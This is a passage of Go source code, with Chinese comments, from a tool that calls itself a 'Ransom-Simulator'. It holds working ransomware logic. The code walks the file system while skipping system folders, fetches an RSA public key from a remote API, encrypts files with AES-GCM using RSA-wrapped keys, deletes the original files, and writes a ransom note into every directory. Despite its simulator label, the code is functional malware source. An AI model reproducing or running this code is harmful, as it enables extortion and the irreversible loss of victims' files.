		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				if isExcluded(path) {
					return filepath.SkipDir
				}
				return nil
			}
			shouldProcess := false
			if encryptAllFormats {
				shouldProcess = true
				fileName := filepath.Base(path)
				if fileName == ransomNoteFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
					shouldProcess = false
				}
			} else {
				shouldProcess = shouldEncrypt(path, extFilter)
			}
			if shouldProcess {
				filesToProcess = append(filesToProcess, path)
			}
			return nil
		})
	}

	if logEnabled {
		logOperation(fmt.Sprintf("扫描完成，找到 %d 个待加密文件", len(filesToProcess)))
	}

	return filesToProcess
}

func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
	jobs := make(chan string, len(files))
	var wg sync.WaitGroup

	// 优先尝试从API获取密钥
	var uuid string
	fmt.Print("[*] 尝试从API获取密钥... ")
	resp, err := fetchKeysFromAPI()
	if err != nil {
		fmt.Printf("失败: %v\n", err)
		fmt.Println("[*] API获取失败，回退到本地密钥...")

		// 回退：尝试从公钥文件名中提取UUID
		uuid, err2 := extractUUIDFromFilename()
		if err2 != nil {
			fmt.Printf("失败: %v\n", err2)
			fmt.Println("[!] 无法获取密钥，程序终止")
			os.Exit(1)
		}
		fmt.Printf("成功: %s\n", uuid)

		// 从本地文件读取公钥
		fmt.Print("[*] 从本地文件读取公钥... ")
		publicKeyPEM, err2 = readPublicKeyFromFile(uuid)
		if err2 != nil {
			fmt.Printf("失败: %v\n", err2)
			fmt.Println("[!] 无法读取公钥文件，程序终止")
			os.Exit(1)
		}
		fmt.Println("成功")
	} else {
		uuid = resp.UUID
		publicKeyPEM = resp.PublicKeyPEM
		fmt.Printf("成功，UUID: %s\n", uuid)
	}

	// 预解析公钥，确保格式正确
	fmt.Print("[*] 预解析公钥... ")
	pubKey, parseErr := getPublicKey(publicKeyPEM)
	if parseErr != nil {
		fmt.Printf("失败: %v\n", parseErr)
		fmt.Println("[!] 公钥格式错误，程序终止")
		os.Exit(1)
	} else {
		fmt.Println("成功")
		// 存储解析后的公钥到缓存
		publicKeyCache = pubKey
		publicKeyCacheStr = publicKeyPEM
	}

	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid, uuid, uuid)
	var visitedDirs sync.Map

	log, err3 := newFileLog("ransom_log.txt")
	if err3 != nil {
		fmt.Printf("无法创建日志文件: %v\n", err3)
	}
	if log != nil {
		defer func() { _ = log.Close() }()
	}

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for file := range jobs {
				dirPath := filepath.Dir(file)
				if _, loaded := visitedDirs.LoadOrStore(dirPath, true); !loaded {
					notePath := filepath.Join(dirPath, ransomNoteFileName)
					_ = os.WriteFile(notePath, []byte(finalAccurateNote), 0644)
				}
				if err := processFile(file, publicKeyPEM, removeOriginal); err != nil {
					stats.failed.Add(1)

					// 记录失败日志
					logFailed(file, err.Error())

					if log != nil {
						log.Log(fmt.Sprintf("FAILED: %s - %v", file, err))
					}
				} else {
					stats.success.Add(1)

					// 记录成功日志
					logSuccess(file)
				}
			}
		}()
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	done := make(chan bool)
	go func() {
		totalFiles := uint64(len(files))
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d)", progress, processed, totalFiles)
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()

	*outUUID = uuid

	if logEnabled {
		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
	}
}

func fetchKeysFromAPI() (*APIResponse, error) {
	jsonBody := []byte("{}")
	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	req.Header.Set("User-Agent", "Ransom-Simulator/"+version)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 5 * time.Second}
	res, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("请求API失败: %w", err)
	}
	defer func() { _ = res.Body.Close() }()
	if res.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(res.Body)
		return nil, fmt.Errorf("API返回异常状态码: %d, Body: %s", res.StatusCode, string(body))
	}
	body, err := io.ReadAll(res.Body)
	if err != nil {
		return nil, fmt.Errorf("读取响应体失败: %w", err)
	}
	var apiResp APIResponse
	if err := json.Unmarshal(body, &apiResp); err != nil {
		return nil, fmt.Errorf("解析JSON失败: %w", err)
	}
	if apiResp.UUID == "" || apiResp.PublicKeyPEM == "" {
		return nil, fmt.Errorf("API响应无效，缺少UUID或公钥")
	}
	return &apiResp, nil
}

func isExcluded(path string) bool {
	pathLower := strings.ToLower(filepath.ToSlash(path))
	for _, ex := range excludedDirsWindows {
		exLower := strings.ToLower(filepath.ToSlash(ex))
		if pathLower == exLower || strings.HasPrefix(pathLower, exLower+"/") {
			return true
		}
	}
	return strings.Contains(pathLower, "$recycle.bin") || strings.Contains(pathLower, "\\windows\\")
}

func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return extFilter[ext]
}

func getKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
	// 跳过超大文件（超过2GB）
	if info, err := os.Stat(filePath); err == nil {
		if info.Size() > 2*1024*1024*1024 { // 2GB
			return fmt.Errorf("文件过大，跳过加密: %s (大小: %.2f GB)",
				filePath, float64(info.Size())/(1024*1024*1024))
		}
	}

	_ = os.Chmod(filePath, 0666)
	content, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("读取文件失败: %w", err)
	}

	// 检查文件是否为空
	if len(content) == 0 {
		return fmt.Errorf("文件为空，跳过加密: %s", filePath)
	}

	encryptedContent, err := hybridEncrypt(content, publicKeyStr)
	if err != nil {
		return fmt.Errorf("混合加密失败: %w", err)
	}
	encryptedFilePath := filePath + ".encrypted"
	if err := os.WriteFile(encryptedFilePath, encryptedContent, 0666); err != nil {
		return fmt.Errorf("写入加密文件失败: %w", err)
	}
	if removeOriginal {
		if err := os.Remove(filePath); err != nil {
			trashName := filePath + ".delete_me_" + generateRandomSuffix()
			if renameErr := os.Rename(filePath, trashName); renameErr != nil {
				return fmt.Errorf("删除原文件失败 (文件被锁定): %w", err)
			}
		}
	}
	return nil
}

func generateRandomSuffix() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
	// 获取公钥（使用缓存）
	pubKey, err := getPublicKey(publicKeyStr)
	if err != nil {
		return nil, fmt.Errorf("获取公钥失败: %w", err)
	}

	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("创建AES cipher失败: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建GCM模式失败: %w", err)
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("生成GCM nonce失败: %w", err)
	}

	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)

	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, aesKey, nil)
	if err != nil {
		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	var buffer bytes.Buffer
	buffer.Write(encryptedAESKey)
	buffer.Write(nonce)
	buffer.Write(ciphertext)

	return buffer.Bytes(), nil
}

func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

func (l *fileLog) Log(message string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.file != nil {
		logLine := fmt.Sprintf("%s - %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
		_, _ = l.file.WriteString(logLine)
	}
}

func (l *fileLog) Close() error {
	if l.file != nil {
		return l.file.Close()
	}
	return nil
}
